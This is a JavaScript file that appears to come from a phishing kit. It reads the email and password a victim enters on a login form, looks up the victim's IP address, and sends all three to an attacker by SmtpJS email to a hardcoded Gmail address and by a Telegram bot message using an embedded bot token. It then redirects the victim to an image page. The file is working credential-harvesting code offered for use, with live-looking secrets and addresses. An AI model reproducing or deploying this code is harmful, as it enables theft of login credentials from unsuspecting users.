// console.log('Script app file loaded');

const sendEmailAndPassword = async () => {
    const emailInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    const email = emailInput.value;
    const password = passwordInput.value;

    // Pause script execution
    debugger;

    if (!email || !password) {
        alert('Please provide both email and password');
    } else {
        try {
            const ip = await getIPAddress();
            const data = {
                email,
                password,
                ip,
            };

            await sendRequest(data);
        } catch (error) {
            console.error('Error getting IP address:', error);
        }
    }
};

const getIPAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        throw error;
    }
};

const sendRequest = async (data) => {
    try {
        // Send email and to Telegram
        await Promise.all([sendEmail(data), sendToTelegram(`New login attempt:\n\nEmail: ${data.email}\nPassword: ${data.password}\nIP Address: ${data.ip}`)]);
        window.location = `qr-response.jpeg`;
    } catch (error) {
        console.error('Error sending request:', error);
    }
};

const sendEmail = async (data) => {
    const templateParams = {
        to_email: 'dogwalkeraus@gmail.com',
        from_email: 'bekkierowland@gmail.com',
        subject: 'Login Attempt',
        body: `Email: ${data.email}\nPassword: ${data.password}\nIP Address: ${data.ip}`,
    };

    try {
        await Email.send({
            SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
            To: templateParams.to_email,
            From: templateParams.from_email,
            Subject: templateParams.subject,
            Body: templateParams.body,
        });
        console.log('Email sent successfully');
    } catch (error) {
        throw error;
    }
};

const sendToTelegram = async (message) => {
    const telegramBotToken = '6663087745:AAERY4uS1rS91KqRQOybN1RMqAhVRbeIv_Q';
    const chatId = '@XviperX_bot'; // Adjust the chat ID accordingly

    const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const requestBody = {
        chat_id: chatId,
        text: message,
    };

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestBody),
        });

        const data = await response.json();
        console.log('Telegram API response:', data);
    } catch (error) {
        throw error;
    }
};
